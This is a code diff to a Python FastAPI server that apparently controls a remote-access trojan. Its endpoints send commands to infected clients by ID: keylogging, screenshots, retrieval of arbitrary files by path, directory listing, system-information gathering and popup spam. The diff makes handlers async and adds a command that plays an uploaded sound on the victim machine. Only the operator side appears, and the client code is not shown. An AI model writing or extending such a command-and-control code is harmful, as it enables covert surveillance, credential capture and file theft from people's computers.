@@ -1,13 +1,14 @@
 import argparse
+import base64
 from pathlib import Path
 from typing import Optional
 
 import uvicorn
-from fastapi import FastAPI
+from fastapi import FastAPI, UploadFile, File
 
 import configurator
 from commands import PopupCommand, PopupParameters, BasicCommand, CommandType, KeyLogCommand, KeyLogParameters, \
-    GetFileCommand, GetFileParameters, DirListCommand, DirListParameters
+    GetFileCommand, GetFileParameters, DirListCommand, DirListParameters, PlaySoundCommand, PlaySoundParameters
 from protocol.requests import RequestHeader, RequestType, SendCommandRequest, SendCommandContent
 from protocol.responses import BasicResponse, SendCommandResponse
 
@@ -26,8 +27,8 @@ def make_command_request(request: SendCommandRequest) -> SendCommandResponse:
     return server.handle_send_command(request)
 
 
-@app.get("/popup")
-def send_popup_command(client_id: str, message: str) -> BasicResponse:
+@app.put("/popup")
+async def send_popup_command(client_id: str, message: str) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
             header=RequestHeader(
@@ -45,8 +46,8 @@ def send_popup_command(client_id: str, message: str) -> BasicResponse:
     )
 
 
-@app.get("/popup-spam")
-def send_popup_spam_command(client_id: str, message: str) -> BasicResponse:
+@app.put("/popup-spam")
+async def send_popup_spam_command(client_id: str, message: str) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
             header=RequestHeader(
@@ -66,7 +67,7 @@ def send_popup_spam_command(client_id: str, message: str) -> BasicResponse:
 
 
 @app.get("/screenshot")
-def send_screenshot_command(client_id: str) -> BasicResponse:
+async def send_screenshot_command(client_id: str) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
             header=RequestHeader(
@@ -79,7 +80,7 @@ def send_screenshot_command(client_id: str) -> BasicResponse:
 
 
 @app.get("/keylog")
-def send_keylog_command(client_id: str, duration: int) -> BasicResponse:
+async def send_keylog_command(client_id: str, duration: int) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
             header=RequestHeader(
@@ -92,7 +93,7 @@ def send_keylog_command(client_id: str, duration: int) -> BasicResponse:
 
 
 @app.get("/get-system-info")
-def send_get_system_info_command(client_id: str) -> BasicResponse:
+async def send_get_system_info_command(client_id: str) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
             header=RequestHeader(
@@ -105,7 +106,7 @@ def send_get_system_info_command(client_id: str) -> BasicResponse:
 
 
 @app.get("/getfile")
-def send_getfile_command(client_id: str, path: str) -> BasicResponse:
+async def send_getfile_command(client_id: str, path: str) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
             header=RequestHeader(
@@ -118,7 +119,7 @@ def send_getfile_command(client_id: str, path: str) -> BasicResponse:
 
 
 @app.get("/dirlist")
-def send_dirlist_command(client_id: str, path: str, tree: bool = True, depth: Optional[int] = None) -> BasicResponse:
+async def send_dirlist_command(client_id: str, path: str, tree: bool = True, depth: Optional[int] = None) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
             header=RequestHeader(
@@ -128,6 +129,23 @@ def send_dirlist_command(client_id: str, path: str, tree: bool = True, depth: Op
             content=SendCommandContent(command=DirListCommand(parameters=DirListParameters(path=path,
                                                                                            depth=depth,
                                                                                            tree=tree)))
+        )
+    )
+
+
+@app.put("/play-sound")
+async def send_play_sound_command(client_id: str, sound_buffer: UploadFile = File(...)) -> BasicResponse:
+    return make_command_request(
+        SendCommandRequest(
+            header=RequestHeader(
+                client_id=client_id,
+                request_type=RequestType.SendCommand
+            ),
+            content=SendCommandContent(command=PlaySoundCommand(
+                parameters=PlaySoundParameters(
+                    sound_buffer=base64.b64encode(await sound_buffer.read())
+                )
+            ))
         )
     )
 
